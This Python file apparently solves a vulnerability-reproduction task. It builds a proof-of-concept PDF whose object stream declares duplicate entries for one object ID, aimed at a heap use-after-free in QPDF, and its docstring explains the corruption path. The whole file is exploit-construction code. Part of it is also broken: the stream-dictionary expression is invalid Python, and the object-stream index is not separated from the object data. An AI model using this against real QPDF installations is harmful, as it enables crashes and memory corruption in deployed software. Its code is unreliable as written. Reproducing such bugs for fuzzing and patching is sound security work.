class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for a heap-use-after-free in QPDF.

        The vulnerability (oss-fuzz:42535152) is triggered by an object stream
        containing duplicate entries for the same object ID. When QPDF processes
        this file with the `--object-streams=preserve` option, its internal
        object cache becomes corrupted. `QPDF::getCompressibleObjSet` sees the
        duplicate object ID, deletes it from the cache, but other parts of the
        code, specifically `QPDFWriter::preserveObjectStreams`, still hold a
        handle to the now-freed object. Subsequent access to this handle
        results in a use-after-free.

        This PoC constructs a minimal PDF file with such a malicious object
        stream.
        """
        
        pdf_parts = []
        object_offsets = {}

        # Part 1: PDF Header
        pdf_parts.append(b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n")

        # Part 2: PDF Objects
        
        # Object 1: The document catalog (root object).
        obj_num = 1
        current_offset = len(b"".join(pdf_parts))
        object_offsets[obj_num] = current_offset
        pdf_parts.append(b"1 0 obj\n<</Type /Catalog /Pages 2 0 R>>\nendobj\n")

        # Object 2: The pages tree root.
        obj_num = 2
        current_offset = len(b"".join(pdf_parts))
        object_offsets[obj_num] = current_offset
        pdf_parts.append(b"2 0 obj\n<</Type /Pages /Count 1 /Kids [3 0 R]>>\nendobj\n")

        # Object 3: A page object. It references object 5, which is defined
        # inside the malicious stream. This ensures the stream is parsed and
        # its contents are loaded into the object cache.
        obj_num = 3
        current_offset = len(b"".join(pdf_parts))
        object_offsets[obj_num] = current_offset
        pdf_parts.append(b"3 0 obj\n<</Type /Page /Parent 2 0 R /Resources <</XObject <</MyObj 5 0 R>>>>>>\nendobj\n")

        # Object 4: The malicious object stream.
        # It declares two objects, both with object ID 5.
        
        # Define two different versions of object 5.
        obj5_v1 = b"<</Version 1>>"
        obj5_v2 = b"<</Version 2>>"
        
        # The stream's index part lists the objects it contains and their offsets
        # relative to the start of the object data.
        # Format: obj_id_1 offset_1 obj_id_2 offset_2 ...
        index_part = f"5 0 5 {len(obj5_v1)}".encode()
        
        # The actual data for the objects follows the index.
        objects_part = obj5_v1 + obj5_v2
        stream_content = index_part + objects_part
        
        # The dictionary for the stream object itself.
        stream_dict = (
            b"<</Type /ObjStm "
            b"/N 2 "
            b"/First %d " % len(index_part)
            b"/Length %d>>" % len(stream_content)
        )
        
        obj4_body = stream_dict + b"\nstream\n" + stream_content + b"\nendstream"
        
        obj_num = 4
        current_offset = len(b"".join(pdf_parts))
        object_offsets[obj_num] = current_offset
        pdf_parts.append(b"4 0 obj\n" + obj4_body + b"\nendobj\n")

        # Part 3: PDF File Structure (XRef Table and Trailer)
        
        pdf_body = b"".join(pdf_parts)
        
        # The cross-reference (xref) table maps object IDs to their byte offsets.
        xref_offset = len(pdf_body)
        num_xref_entries = max(object_offsets.keys()) + 1

        xref_table_parts = []
        xref_table_parts.append(f"xref\n0 {num_xref_entries}\n".encode())
        # Object 0 is a special null entry.
        xref_table_parts.append(b"0000000000 65535 f \n")
        
        for i in sorted(object_offsets.keys()):
            offset = object_offsets[i]
            xref_table_parts.append(f"{offset:010d} 00000 n \n".encode())

        xref_table = b"".join(xref_table_parts)

        # The trailer points to the root object and the xref table.
        trailer = (
            b"trailer\n"
            b"<</Size %d /Root 1 0 R>>\n" % num_xref_entries +
            b"startxref\n" +
            f"{xref_offset}\n".encode() +
            b"%%EOF\n"
        )

        # Combine all parts to create the final PoC file.
        poc = pdf_body + xref_table + trailer
        return poc